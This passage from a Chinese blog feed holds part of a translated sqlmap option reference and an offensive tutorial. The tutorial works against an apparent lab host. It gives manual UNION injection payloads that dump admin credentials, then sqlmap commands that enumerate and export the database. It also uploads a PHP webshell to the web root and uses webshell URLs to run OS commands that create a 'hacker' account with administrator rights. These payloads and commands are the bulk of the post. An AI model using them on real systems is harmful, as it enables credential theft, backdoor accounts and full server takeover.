    --force-ssl         强制使用 SSL/HTTPS
    --hpp               使用 HTTP 参数污染攻击
    --eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如："import hashlib;id2=hashlib.md5(id).hexdigest()"）
</code></pre>

<h4>3、优化</h4>

<p>以下选项用于优化 sqlmap 性能</p>

<pre><code>    -o                  开启所有优化开关
    --predict-output    预测常用请求的输出
    --keep-alive        使用持久的 HTTP(S) 连接
    --null-connection   仅获取页面大小而非实际的 HTTP 响应
    --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）
</code></pre>

<h4>4、注入</h4>

<p>以下选项用于指定要测试的参数，提供自定义注入 payloads 和篡改参数的脚本</p>

<pre><code>    -p TESTPARAMETER    指定需要测试的参数
    --skip=SKIP         指定要跳过的参数
    --skip-static       指定跳过非动态参数
    --param-exclude=..  用正则表达式排除参数（例如："ses"）
    --dbms=DBMS         指定后端 DBMS（Database Management System，
                        数据库管理系统）类型（例如：MySQL）
    --dbms-cred=DBMS..  DBMS 认证凭据（username:password）
    --os=OS             指定后端 DBMS 的操作系统类型
    --invalid-bignum    将无效值设置为大数
    --invalid-logical   对无效值使用逻辑运算
    --invalid-string    对无效值使用随机字符串
    --no-cast           关闭 payload 构造机制
    --no-escape         关闭字符串转义机制
    --prefix=PREFIX     注入 payload 的前缀字符串
    --suffix=SUFFIX     注入 payload 的后缀字符串
    --tamper=TAMPER     用给定脚本修改注入数据
</code></pre>

<h4>5、检测</h4>

<p>以下选项用于自定义检测方式</p>

<pre><code>    --level=LEVEL       设置测试等级（1-5，默认为 1）
    --risk=RISK         设置测试风险等级（1-3，默认为 1）
    --string=STRING     用于确定查询结果为真时的字符串
    --not-string=NOT..  用于确定查询结果为假时的字符串
    --regexp=REGEXP     用于确定查询结果为真时的正则表达式
    --code=CODE         用于确定查询结果为真时的 HTTP 状态码
    --text-only         只根据页面文本内容对比页面
    --titles            只根据页面标题对比页面
</code></pre>

<h4>6、技术</h4>

<p>以下选项用于调整特定 SQL 注入技术的测试方法</p>

<pre><code>    --technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：
                        B: Boolean-based blind SQL injection（布尔型盲注）
                        E: Error-based SQL injection（报错型注入）
                        U: UNION query SQL injection（联合查询注入）
                        S: Stacked queries SQL injection（堆叠查询注入）
                        T: Time-based blind SQL injection（时间型盲注）
                        Q: inline Query injection（内联查询注入）
    --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）
    --union-cols=UCOLS  设置联合查询注入测试的列数目范围
    --union-char=UCHAR  用于暴力猜解列数的字符
    --union-from=UFROM  设置联合查询注入 FROM 处用到的表
    --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：
                        推荐阅读《在SQL注入中使用DNS获取数据》
                        http://cb.drops.wiki/drops/tips-5283.html，
                        在后面的“技术”小节中也有相应解释）
    --second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：该选项用于 SQL 二阶注入）
    --second-req=SEC..  从文件读取 HTTP 二阶请求
</code></pre>

<h4>7、指纹识别</h4>

<pre><code>    -f, --fingerprint   执行广泛的 DBMS 版本指纹识别
</code></pre>

<h4>8、枚举</h4>

<p>以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据。此外，还可以运行你输入的 SQL 语句</p>

<pre><code>    -a, --all           获取所有信息、数据
    -b, --banner        获取 DBMS banner
    --current-user      获取 DBMS 当前用户
    --current-db        获取 DBMS 当前数据库
    --hostname          获取 DBMS 服务器的主机名
    --is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）
    --users             枚举出 DBMS 所有用户
    --passwords         枚举出 DBMS 所有用户的密码哈希
    --privileges        枚举出 DBMS 所有用户特权级
    --roles             枚举出 DBMS 所有用户角色
    --dbs               枚举出 DBMS 所有数据库
    --tables            枚举出 DBMS 数据库中的所有表
    --columns           枚举出 DBMS 表中的所有列
    --schema            枚举出 DBMS 所有模式
    --count             获取数据表数目
    --dump              导出 DBMS 数据库表项
    --dump-all          导出所有 DBMS 数据库表项
    --search            搜索列，表和/或数据库名
    --comments          枚举数据时检查 DBMS 注释
    -D DB               指定要枚举的 DBMS 数据库
    -T TBL              指定要枚举的 DBMS 数据表
    -C COL              指定要枚举的 DBMS 数据列
    -X EXCLUDE          指定不枚举的 DBMS 标识符
    -U USER             指定枚举的 DBMS 用户
    --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库
    --pivot-column=P..  指定主列
    --where=DUMPWHERE   在转储表时使用 WHERE 条件语句
    --start=LIMITSTART  指定要导出的数据表条目开始行数
    --stop=LIMITSTOP    指定要导出的数据表条目结束行数
    --first=FIRSTCHAR   指定获取返回查询结果的开始字符位
    --last=LASTCHAR     指定获取返回查询结果的结束字符位
    --sql-query=QUERY   指定要执行的 SQL 语句
    --sql-shell         调出交互式 SQL shell
    --sql-file=SQLFILE  执行文件中的 SQL 语句
</code></pre>

<h4>9、暴力破解</h4>

<p>以下选项用于暴力破解测试</p>

<pre><code>    --common-tables     检测常见的表名是否存在
    --common-columns    检测常用的列名是否存在
</code></pre>

<h4>10、用户自定义函数注入</h4>

<p>以下选项用于创建用户自定义函数</p>

<pre><code>    --udf-inject        注入用户自定义函数
    --shared-lib=SHLIB  共享库的本地路径
</code></pre>

<h4>11、访问文件系统</h4>

<p>以下选项用于访问后端 DBMS 的底层文件系统</p>

<pre><code>    --file-read=FILE..  读取后端 DBMS 文件系统中的文件
    --file-write=FIL..  写入到后端 DBMS 文件系统中的文件
    --file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件
</code></pre>

<h4>12、访问操作系统</h4>

<p>以下选项用于访问后端 DBMS 的底层操作系统</p>

<pre><code>    --os-cmd=OSCMD      执行操作系统命令
    --os-shell          调出交互式操作系统 shell
    --os-pwn            调出 OOB shell，Meterpreter 或 VNC
    --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC
    --os-bof            利用存储过程的缓冲区溢出
    --priv-esc          数据库进程用户提权
    --msf-path=MSFPATH  Metasploit 框架的本地安装路径
    --tmp-path=TMPPATH  远程临时文件目录的绝对路径
</code></pre>

<h4>13、访问 Windows 注册表</h4>

<p>以下选项用于访问后端 DBMS 的 Windows 注册表</p>

<pre><code>    --reg-read          读取一个 Windows 注册表键值
    --reg-add           写入一个 Windows 注册表键值数据
    --reg-del           删除一个 Windows 注册表键值
    --reg-key=REGKEY    指定 Windows 注册表键
    --reg-value=REGVAL  指定 Windows 注册表键值
    --reg-data=REGDATA  指定 Windows 注册表键值数据
    --reg-type=REGTYPE  指定 Windows 注册表键值类型
</code></pre>

<h4>14、通用选项</h4>

<p>以下选项用于设置通用的参数</p>

<pre><code>    -s SESSIONFILE      从文件（.sqlite）中读入会话信息
    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件
    --batch             从不询问用户输入，使用默认配置
    --binary-fields=..  具有二进制值的结果字段（例如："digest"）
    --check-internet    在访问目标之前检查是否正常连接互联网
    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站
    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）
    --csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）
    --charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）
    --dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）
    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）
    --eta               显示每个结果输出的预计到达时间
    --flush-session     清空当前目标的会话文件
    --forms             解析并测试目标 URL 的表单
    --fresh-queries     忽略存储在会话文件中的查询结果
    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中
    --hex               获取数据时使用 hex 转换
    --output-dir=OUT..  自定义输出目录路径
    --parse-errors      从响应中解析并显示 DBMS 错误信息
    --preprocess=PRE..  使用给定脚本预处理响应数据
    --repair            重新导出具有未知字符的数据（?）
    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件
    --scope=SCOPE       用正则表达式从提供的代理日志中过滤目标
    --test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试
    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试
    --update            更新 sqlmap
</code></pre>

<h4>15、杂项</h4>

<pre><code>    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）
    --alert=ALERT       在找到 SQL 注入时运行 OS 命令
    --answers=ANSWERS   设置预定义回答（例如：“quit=N,follow=N”）
    --beep              出现问题提醒或在发现 SQL 注入时发出提示音
    --cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表
    --dependencies      检查 sqlmap 缺少（可选）的依赖
    --disable-coloring  关闭彩色控制台输出
    --gpage=GOOGLEPAGE  指定页码使用 Google dork 结果
    --identify-waf      针对 WAF/IPS 防护进行彻底的测试
    --mobile            使用 HTTP User-Agent 模仿智能手机
    --offline           在离线模式下工作（仅使用会话数据）
    --purge             安全删除 sqlmap data 目录所有内容
    --skip-waf          跳过启发式检测 WAF/IPS 防护
    --smart             只有在使用启发式检测时才进行彻底的测试
    --sqlmap-shell      调出交互式 sqlmap shell
    --tmp-dir=TMPDIR    指定用于存储临时文件的本地目录
    --web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）
    --wizard            适合初级用户的向导界面
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sqlmap超详细讲解]]></title>
    <link href="http://abcdxyzk.github.io/blog/2022/10/30/sqlmap/"/>
    <updated>2022-10-30T11:04:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2022/10/30/sqlmap</id>
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/A485860941/article/details/124148554">https://blog.csdn.net/A485860941/article/details/124148554</a></p>

<h2>安装</h2>

<pre><code>    pip install sqlmap
</code></pre>

<h2>什么是SQL注入</h2>

<p>所谓SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求查询的字符串,最终达到欺骗服务器执行恶意的SQL命令,假如管理员没有对id参数进行过滤那么黑客可以通过数据传输点将恶意的SQL语句带入查询.</p>

<h2>手工注入</h2>

<h4>第一步</h4>

<p>找到漏洞链接</p>

<p><img src="/images/tools/20221030-1.png" alt="" /></p>

<h4>第二步</h4>

<p>获取列长度 说明目前使用的数据库表格只有3列</p>

<p>order by 3#</p>

<p><img src="/images/tools/20221030-2.png" alt="" /></p>

<p><img src="/images/tools/20221030-3.png" alt="" /></p>

<h4>第三步</h4>

<p>使用联合查询从而获当前用户和数据名与数据库版本</p>

<p>union select user(),database(),version()#</p>

<p><img src="/images/tools/20221030-4.png" alt="" /></p>

<h4>第四步</h4>

<p>查询所有表格,我们已经知道目前所使用的数据库名是zkpy接下来我们查询表格名字</p>

<p>union select 1,2,table_name from information_schema.tables where table_schema=&lsquo;zkpy&rsquo;#</p>

<p>回显出二个表格名称</p>

<p><img src="/images/tools/20221030-5.png" alt="" /></p>

<h4>第五步</h4>

<p>我们查看表格里面列 我们先猜解admin表吧 因为admin是管理员所以我们先猜它</p>

<p>union select 1,2,column_name from information_schema.columns where table_name=&lsquo;admin&rsquo;#</p>

<p>回显信息列有 id,username,password</p>

<p><img src="/images/tools/20221030-6.png" alt="" /></p>

<h4>第六步</h4>

<p>我们进行查看username和password里面内容</p>

<p>union select 1,username,password from admin&ndash;+</p>

<p>可以看出账号是alpha密码是zkpy00Q</p>

<p><img src="/images/tools/20221030-7.png" alt="" /></p>

<h4>如果感觉手工注入麻烦的话,下面给大家带来二个工具注入sql,使用起来更简洁更方便更快,更有效率的来获取你想知道的内容</h4>

<h2>sqlmap工具注入</h2>

<p>sqlmap是基于注入的一个工具,从而达到轻松获取内容</p>

<pre><code>    sqlmap -u "URL" --batch       --batch代表全自动 不用我们手动输入y/n

    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1"
</code></pre>

<p><img src="/images/tools/20221030-8.png" alt="" /></p>

<p>有漏洞接下来我们查看当前使用的数据库</p>

<pre><code>    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" --current-db --batch
</code></pre>

<p><img src="/images/tools/20221030-9.png" alt="" /></p>

<p>查看当前数据库使用的用户是谁</p>

<pre><code>    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" --current-user --batch
</code></pre>

<p><img src="/images/tools/20221030-10.png" alt="" /></p>

<p>查看当前数据库是否是管理员权限</p>

<pre><code>    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" --is-dba --batch  回显True就代表是管理员
</code></pre>

<p><img src="/images/tools/20221030-11.png" alt="" /></p>

<p>接下来我们来报表格 当前所使用的数据库是zkpy</p>

<pre><code>    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" -D zkpy --tables --batch
</code></pre>

<p><img src="/images/tools/20221030-12.png" alt="" /></p>

<p>回显信息显示有admin表格和news表  admin为管理员所以先破解admin表</p>

<pre><code>    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" -D zkpy -T admin --columns --batch
</code></pre>

<p>admin表格里面有3列，分别是 id,username,password</p>

<p><img src="/images/tools/20221030-13.png" alt="" /></p>

<p>接下来我们导出这三列内容   &ndash;batch为导出</p>

<pre><code>    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" -D zkpy -T admin -C id,username,password --dump --batch 
</code></pre>

<p>接下来就完毕了,成功获取用户名与密码</p>

<p><img src="/images/tools/20221030-14.png" alt="" /></p>

<h2>获取控制服务器</h2>

<p>接下来我们使用sqlmap传递一个php脚本从而获取控制服务器</p>

<p>我们使用
<code>
    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" --os-shell 来查看网页根目录
</code></p>

<p><img src="/images/tools/20221030-15.png" alt="" /></p>

<p>网页根目录是 C:/phpstudy/www 这是一个windows windows不区分大小写我们怎么样写都行</p>

<p>我们首先编辑一个木马文件 创建文件名为 shell.php</p>

<p><img src="/images/tools/20221030-16.png" alt="" /></p>

<p>首先使用sqlmap上传文件 靶机my.ini配置文件里面必须开启这一项 否者不可上传不可读</p>

<p><img src="/images/tools/20221030-17.png" alt="" /></p>

<p>接下来我们使用sqlmap上传一下shell.php文件</p>

<pre><code>    --file-write 是写入文件使用我们木马路径   --file-dest 是目的地 使用对方网页路径

    sqlmap -u "http://172.16.15.24/sqls/index.php?id=1" --file-write "/root/shell.php" --file-dest "c:/phpstudy/www/shell.php"
</code></pre>

<p>然后到浏览器访问我们刚才上传的木马即可 查看php信息</p>

<pre><code>    http://172.16.15.24/shell.php?CMD=phpinfo();
</code></pre>

<p><img src="/images/tools/20221030-18.png" alt="" /></p>

<p>查看靶机权限</p>

<pre><code>    http://172.16.15.24/shell.php?CMD=echo passthru('whoami');
</code></pre>

<p><img src="/images/tools/20221030-19.png" alt="" /></p>

<p>创建hacker用户</p>

<pre><code>    http://172.16.15.24/shell.php?CMD=echo passthru('net user hacker 1234560.0 /add');
</code></pre>

<p><img src="/images/tools/20221030-20.png" alt="" /></p>

<p>授予用户管理员组让hacker用户也可以享受管理员权限</p>

<pre><code>    http://172.16.15.24/shell.php?CMD=echo passthru('net localgroup administrators hacker /add');
</code></pre>

<p><img src="/images/tools/20221030-21.png" alt="" /></p>

<p>下面查看一下hacker用户是否存在 如果存在的话是什么权限</p>

<p>快捷方式你也可以使用
```
    <a href="http://172.16.15.24/shell.php?CMD=echo">http://172.16.15.24/shell.php?CMD=echo</a> passthru(&lsquo;net user hacker&rsquo;);</p>

<pre><code>http://172.16.15.24/shell.php?CMD=echo passthru('net user'); 
</code></pre>

<p>```</p>

<p><img src="/images/tools/20221030-22.png" alt="" /></p>

<p>可以看到hacker用户存在的接下来查看一下它是什么组</p>

<p>接下来我们就可以任意执行代码了 也可以上传php脚本里面的include和require文件包含</p>

<p><img src="/images/tools/20221030-23.png" alt="" /></p>
]]></content>
  </entry>
  
</feed>
